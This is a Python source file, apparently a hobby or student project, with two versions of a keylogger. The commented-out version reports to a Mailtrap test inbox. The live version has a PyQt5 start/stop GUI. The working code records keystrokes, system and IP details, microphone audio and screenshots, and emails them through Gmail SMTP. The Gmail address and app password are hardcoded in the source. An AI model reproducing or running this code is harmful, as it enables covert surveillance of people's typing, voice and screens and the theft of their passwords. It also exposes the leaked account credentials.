# try:
#     import os
#     import platform
#     import smtplib
#     import socket
#     import threading
#     import wave
#     import pyscreenshot
#     import sounddevice as sd
#     from pynput import keyboard, mouse
#     from email.mime.multipart import MIMEMultipart
#     from email.mime.text import MIMEText
#     from email.mime.base import MIMEBase
#     from email import encoders
#     import numpy as np
# except ModuleNotFoundError:
#     from subprocess import call
#     modules = ["pyscreenshot", "sounddevice", "pynput", "numpy"]
#     call("pip install " + ' '.join(modules), shell=True)

# EMAIL_ADDRESS = "68f7a601e38e94"      # replace with your Mailtrap username
# EMAIL_PASSWORD = "675d185ec30706"     # replace with your Mailtrap password
# SEND_REPORT_EVERY = 30  # seconds
# SMTP_SERVER = "smtp.mailtrap.io"
# SMTP_PORT = 2525

# class KeyLogger:
#     def __init__(self, time_interval, email, password):
#         self.interval = time_interval
#         self.log = "KeyLogger Started...\n"
#         self.email = email
#         self.password = password

#     def appendlog(self, string):
#         self.log += string 

#     # def on_move(self, x, y):
#     #     self.appendlog(f"[Mouse moved to] {x}, {y}")

#     # def on_click(self, x, y, button, pressed):
#     #     action = "Pressed" if pressed else "Released"
#     #     self.appendlog(f"[Mouse {action} at] {x}, {y}")

#     # def on_scroll(self, x, y, dx, dy):
#     #     self.appendlog(f"[Mouse scrolled at] {x}, {y} (dx={dx}, dy={dy})")

#     def save_data(self, key):
#         try:
#             current_key = str(key.char)
#         except AttributeError:
#             if key == key.space:
#                 current_key = " [SPACE] "
#             elif key == key.enter:
#                 current_key = " [ENTER]\n"
#             else:
#                 current_key = f" [{str(key)}] "
#         self.appendlog(current_key)

#     def send_mail(self, subject, body, attachment_path=None):
#         msg = MIMEMultipart()
#         msg['From'] = self.email
#         msg['To'] = self.email  # Send to self (Mailtrap test inbox)
#         msg['Subject'] = subject

#         msg.attach(MIMEText(body, 'plain'))

#         if attachment_path and os.path.exists(attachment_path):
#             with open(attachment_path, 'rb') as f:
#                 part = MIMEBase('application', 'octet-stream')
#                 part.set_payload(f.read())
#                 encoders.encode_base64(part)
#                 part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment_path)}')
#                 msg.attach(part)

#         try:
#             with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
#                 server.login(self.email, self.password)
#                 server.send_message(msg)
#                 print(f"[+] Email sent: {subject}")
#         except Exception as e:
#             print("[-] Failed to send email:", e)

#     def report(self):
#         self.send_mail("Keylogger Report", self.log)
#         self.log = ""
#         timer = threading.Timer(self.interval, self.report)
#         timer.start()

#     def system_information(self):
#         try:
#             hostname = socket.gethostname()
#             ip = socket.gethostbyname(hostname)
#         except:
#             ip = "Unable to get IP"

#         plat = platform.processor()
#         system = platform.system()
#         machine = platform.machine()
#         info = f"\n[System Info]\nHostname: {hostname}\nIP: {ip}\nPlatform: {plat}\nOS: {system}\nMachine: {machine}"
#         self.appendlog(info)

#     def microphone(self):
#         fs = 44100
#         seconds = 5
#         filename = "mic.wav"

#         try:
#             recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
#             sd.wait()
#             with wave.open(filename, 'wb') as wf:
#                 wf.setnchannels(2)
#                 wf.setsampwidth(2)
#                 wf.setframerate(fs)
#                 wf.writeframes(recording.tobytes())
#             self.send_mail("Mic Recording", "Audio captured from microphone", filename)
#             os.remove(filename)
#         except Exception as e:
#             print("[-] Microphone error:", e)

#     def screenshot(self):
#         filename = "screenshot.png"
#         try:
#             img = pyscreenshot.grab()
#             img.save(filename)
#             self.send_mail("Screenshot", "Screenshot of screen", filename)
#             os.remove(filename)
#         except Exception as e:
#             print("[-] Screenshot error:", e)

#     def run(self):
#         self.system_information()
#         self.report()
#         self.microphone()
#         self.screenshot()

#         key_listener = keyboard.Listener(on_press=self.save_data)
#         # mouse_listener = mouse.Listener(on_click=self.on_click)

#         key_listener.start()
#         # mouse_listener.start()

#         key_listener.join()
#         # mouse_listener.join()

# keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
# keylogger.run()



import os
import threading
import logging
import smtplib
import socket
import platform
import wave
import sounddevice as sd
import datetime
import time
import pyautogui
from email.message import EmailMessage
from pynput import keyboard
from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QVBoxLayout,
    QStackedWidget, QPushButton, QLineEdit, QMessageBox, QHBoxLayout
)
from PyQt5.QtCore import Qt
import sys
import matplotlib.pyplot as plt
from collections import Counter

# KeyLogger Class
class KeyLogger:
    def __init__(self, interval=30):
        self.interval = interval
        self.log = ""
        self.email = "mytemp2100@gmail.com"
        self.password = "mnyg strj elyy znqz"
        self.hostname = socket.gethostname()
        self.ip = socket.gethostbyname(self.hostname)
        self.system_info = ""
        self.key_history = []
        self.listener = None
        self.timer = None
        self.running = False

    def save_data(self, key):
        try:
            key = str(key.char)
        except AttributeError:
            key = str(key)
        self.log += key
        self.key_history.append(key)

    def report(self):
        if self.running and self.log:
            self.send_email("Keystroke Report", self.log)
            self.log = ""
        self.timer = threading.Timer(self.interval, self.report)
        self.timer.daemon = True
        self.timer.start()

    def system_information(self):
        self.system_info = f"""Hostname: {self.hostname}
        IP Address: {self.ip}
        System: {platform.system()} {platform.version()}
        Machine: {platform.machine()}"""

    def screenshot(self):
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        self.send_email("Screenshot", "Screenshot captured", "screenshot.png")

    def microphone(self):
        fs = 44100
        duration = 5
        audio = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        wave_output = wave.open("audio.wav", 'wb')
        wave_output.setnchannels(2)
        wave_output.setsampwidth(2)
        wave_output.setframerate(fs)
        wave_output.writeframes(audio.tobytes())
        wave_output.close()
        self.send_email("Audio Recording", "Audio has been recorded", "audio.wav")

    def send_email(self, subject, body, attachment_path=None):
        try:
            msg = EmailMessage()
            msg.set_content(body)
            msg["Subject"] = subject
            msg["From"] = self.email
            msg["To"] = self.email
            if attachment_path and os.path.exists(attachment_path):
                with open(attachment_path, "rb") as f:
                    file_data = f.read()
                    file_name = os.path.basename(attachment_path)
                msg.add_attachment(file_data, maintype="application", subtype="octet-stream", filename=file_name)
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
                smtp.login(self.email, self.password)
                smtp.send_message(msg)
        except Exception as e:
            print(f"[!] Failed to send email: {e}")

    def generate_daily_chart(self):
        if not self.key_history:
            return
        key_counts = Counter(self.key_history)
        keys = list(key_counts.keys())
        values = list(key_counts.values())
        plt.figure(figsize=(10, 6))
        plt.bar(keys, values)
        plt.title("Daily Key Press Count")
        plt.xlabel("Keys")
        plt.ylabel("Frequency")
        plt.tight_layout()
        plt.savefig("daily_chart.png")
        self.send_email("Daily Key Chart", "Here is the chart for today's keys", "daily_chart.png")

    def start(self):
        self.system_information()
        self.running = True
        self.report()
        self.microphone()
        self.screenshot()
        self.listener = keyboard.Listener(on_press=self.save_data)
        self.listener.start()

    def stop(self):
        self.running = False
        if self.listener:
            self.listener.stop()
        if self.timer:
            self.timer.cancel()
        self.generate_daily_chart()

# GUI Components
class LoginScreen(QWidget):
    def __init__(self, parent):
        super().__init__()
        self.parent = parent
        layout = QVBoxLayout()
        self.setStyleSheet("background-color: #f2f2f2; font-size: 14px;")
        self.label = QLabel("🔐 Enter Password to Start Keylogger")
        self.label.setAlignment(Qt.AlignCenter)
        self.input = QLineEdit()
        self.input.setEchoMode(QLineEdit.Password)
        self.button = QPushButton("Login")
        self.button.setStyleSheet("background-color: #0078d7; color: white; padding: 5px;")
        self.button.clicked.connect(self.check_login)
        layout.addWidget(self.label)
        layout.addWidget(self.input)
        layout.addWidget(self.button)
        self.setLayout(layout)

    def check_login(self):
        if self.input.text() == "admin":
            self.parent.start_keylogger()
            self.parent.setCurrentIndex(1)
        else:
            QMessageBox.critical(self, "Error", "Incorrect Password!")

class MainScreen(QWidget):
    def __init__(self, parent):
        super().__init__()
        self.parent = parent
        layout = QVBoxLayout()
        self.label = QLabel("🟢 Keylogger is Running...")
        self.label.setAlignment(Qt.AlignCenter)
        self.stop_button = QPushButton("Stop Keylogger")
        self.stop_button.setStyleSheet("background-color: red; color: white; padding: 8px;")
        self.stop_button.clicked.connect(self.stop_keylogger)
        layout.addWidget(self.label)
        layout.addWidget(self.stop_button)
        self.setLayout(layout)

    def stop_keylogger(self):
        self.parent.keylogger.stop()
        self.label.setText("🔴 Keylogger Stopped. Chart Generated.")
        self.stop_button.setEnabled(False)

class MainApp(QStackedWidget):
    def __init__(self):
        super().__init__()
        self.keylogger = KeyLogger()
        self.login = LoginScreen(self)
        self.main = MainScreen(self)
        self.addWidget(self.login)
        self.addWidget(self.main)

    def start_keylogger(self):
        threading.Thread(target=self.keylogger.start, daemon=True).start()

# Main
def start_gui():
    app = QApplication(sys.argv)
    window = MainApp()
    window.setWindowTitle("Keylogger Monitor")
    window.resize(400, 200)
    window.setFixedSize(400, 200)
    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    start_gui()


